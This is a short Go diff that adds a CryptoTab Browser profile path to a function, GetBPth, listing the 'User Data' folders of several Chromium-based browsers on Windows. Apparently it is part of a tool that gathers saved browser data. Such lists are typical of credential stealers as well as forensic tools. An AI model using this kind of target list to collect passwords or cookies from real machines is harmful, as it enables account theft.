@@ -1,5 +1,4 @@
 package util
-
 import (
 	"os"
 )
@@ -20,6 +19,7 @@ func GetBPth() []string {
 	local := os.Getenv("LOCALAPPDATA")
 	roaming := os.Getenv("APPDATA")
 	var paths = []string{
+		local + "\\CryptoTab Browser\\User Data",
 		local + "\\Amigo\\User Data",
 		local + "\\Torch\\User Data",
 		local + "\\Kometa\\User Data",
